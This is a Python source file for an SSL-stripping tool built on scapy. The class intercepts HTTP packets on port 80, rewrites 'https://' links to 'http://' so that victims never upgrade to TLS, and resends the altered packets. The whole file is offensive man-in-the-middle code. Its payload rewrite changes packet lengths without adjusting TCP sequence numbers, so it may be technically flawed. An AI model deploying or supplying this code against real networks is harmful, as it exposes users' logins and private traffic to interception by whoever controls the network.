import logging
from scapy.layers.inet import IP, TCP
from scapy.all import Raw, sendp

class SSLStripper:
    """
    SSLStripper intercepts HTTP traffic and rewrites any https:// links to http://
    to prevent clients from upgrading to TLS.
    """

    def __init__(self, interface, packet_handler):
        self.interface = interface
        self.packet_handler = packet_handler
        self.filter_index = None
        self.logger = logging.getLogger('SSLStripper')

    def start(self):
        """Activate the SSL stripping filter on the packet handler."""
        self.logger.info("SSLStripper: Starting SSL stripping filter")
        self.filter_index = self.packet_handler.add_filter(self._strip_ssl)

    def stop(self):
        """Remove the SSL stripping filter."""
        if self.filter_index is not None:
            removed = self.packet_handler.remove_filter(self.filter_index)
            if removed:
                self.logger.info("SSLStripper: Removed filter")
            self.filter_index = None
        self.logger.info("SSLStripper: Stopped SSL stripping")

    def _strip_ssl(self, packet):
        """
        Inspect each packet for HTTP payloads. If any payload contains https://,
        rewrite to http:// and resend the modified packet.
        """
        if IP not in packet or TCP not in packet:
            return False
        ip = packet[IP]
        tcp = packet[TCP]

        # Handle HTTP responses from servers (port 80)
        if tcp.sport == 80 and Raw in packet:
            payload = packet[Raw].load
            if b'https://' in payload:
                new_payload = payload.replace(b'https://', b'http://')
                packet[Raw].load = new_payload
                # Recompute IP/TCP checksums and lengths
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                sendp(packet, iface=self.interface, verbose=0)
                self.logger.debug(f"SSLStripper: Stripped https links in response {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}")
                return True

        # Handle HTTP requests from clients (port 80)
        if tcp.dport == 80 and Raw in packet:
            payload = packet[Raw].load
            if b'https://' in payload:
                new_payload = payload.replace(b'https://', b'http://')
                packet[Raw].load = new_payload
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                sendp(packet, iface=self.interface, verbose=0)
                self.logger.debug(f"SSLStripper: Stripped https links in request {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}")
                return True

        return False
